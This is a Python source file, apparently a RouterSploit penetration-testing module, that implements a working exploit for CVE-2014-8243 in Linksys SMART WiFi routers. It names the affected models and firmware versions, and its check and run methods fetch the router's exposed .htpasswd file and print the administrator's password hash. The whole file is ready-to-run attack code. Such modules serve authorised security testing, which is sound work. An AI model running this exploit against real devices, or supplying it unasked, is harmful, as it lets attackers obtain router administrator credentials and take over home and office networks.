import re

from routersploit import (
    exploits,
    mute,
    validators,
    http_request,
    print_info,
    print_success,
    print_error,
)


class Exploit(exploits.Exploit):
    """
    Exploit Linksys SMART WiFi firmware
    If the target is vulnerable it allows remote attackers to obtain the administrator's MD5 password hash
    """
    __info__ = {
        'name': 'Linksys SMART WiFi Password Disclosure',
        'authors': [
            'Sijmen Ruwhof',  # vulnerability discovery
            '0BuRner',  # routersploit module
        ],
        'description': 'Exploit implementation for Linksys SMART WiFi Password Disclosure vulnerability. If target is vulnerable administrator\'s MD5 passsword is retrieved.',
        'references': [
            'https://www.kb.cert.org/vuls/id/447516',
            'http://sijmen.ruwhof.net/weblog/268-password-hash-disclosure-in-linksys-smart-wifi-routers',
            'https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-8243',
            'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8243',
        ],
        'devices': [
            'Linksys EA2700 < Ver.1.1.40 (Build 162751)',
            'Linksys EA3500 < Ver.1.1.40 (Build 162464)',
            'Linksys E4200v2 < Ver.2.1.41 (Build 162351)',
            'Linksys EA4500 < Ver.2.1.41 (Build 162351)',
            'Linksys EA6200 < Ver.1.1.41 (Build 162599)',
            'Linksys EA6300 < Ver.1.1.40 (Build 160989)',
            'Linksys EA6400 < Ver.1.1.40 (Build 160989)',
            'Linksys EA6500 < Ver.1.1.40 (Build 160989)',
            'Linksys EA6700 < Ver.1.1.40 (Build 160989)',
            'Linksys EA6900 < Ver.1.1.42 (Build 161129)',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")

            url = "{}:{}/.htpasswd".format(self.target, self.port)
            response = http_request(method="GET", url=url)
            if response is None:
                print_error("Exploit failed - connection error")
                return

            print_info("Unix crypt hash: $id$salt$hashed")  # See more at http://man7.org/linux/man-pages/man3/crypt.3.html
            print_success("Hash found:", response.text)
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        url = "{}:{}/.htpasswd".format(self.target, self.port)
        response = http_request(method="GET", url=url)

        if response is not None and response.status_code == 200:
            res = re.findall("^([a-zA-Z0-9]+:\$[0-9]\$)", response.text)
            if len(res):
                return True

        return False
